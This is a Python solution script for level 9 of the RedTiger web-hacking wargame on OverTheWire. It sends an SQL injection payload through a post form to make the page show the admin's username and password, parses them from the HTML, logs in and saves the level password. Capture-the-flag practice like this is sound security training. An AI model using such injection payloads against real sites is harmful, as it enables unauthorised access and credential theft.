#!/usr/bin/env python3
import tigers as tg
from bs4 import BeautifulSoup
import re
import tiger_cookies


def main():
    """
    Target: Get the password of the admin.
    """
    table_name = 'level9_users'
    url = "https://redtiger.labs.overthewire.org/level9.php"
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level9login'
    method = 'post'
    inj_param = 'text'
    other_param = {'autor': '', 'title': '', 'post': 'Submit Query'}

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level9login=cooks[level])

    # Payload
    payload = "'), ((select username from level9_users limit 1), (select password from level9_users limit 1),'"
    p = tg.SqlInjection(url, cook, method, inj_param, payload,
                        check_clear=pass_r, other_param=other_param)
    response = p.my_request()

    print(response)

    soup = BeautifulSoup(response, 'html.parser')
    autor = soup.find_all(string=re.compile(
        "Autor:"))[-1].replace('Autor: ', '')
    title = soup.find_all(string=re.compile(
        "Title:"))[-2].replace('Title: ', '')
    print(autor, title)

    # Authorization
    other_param = {'user': autor, 'password': title, 'login': 'Login'}
    p.inj_param = ''
    p.other_param = other_param
    response = p.my_request()

    # Еxtracting data from html
    passw = p.extract_pass(response)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
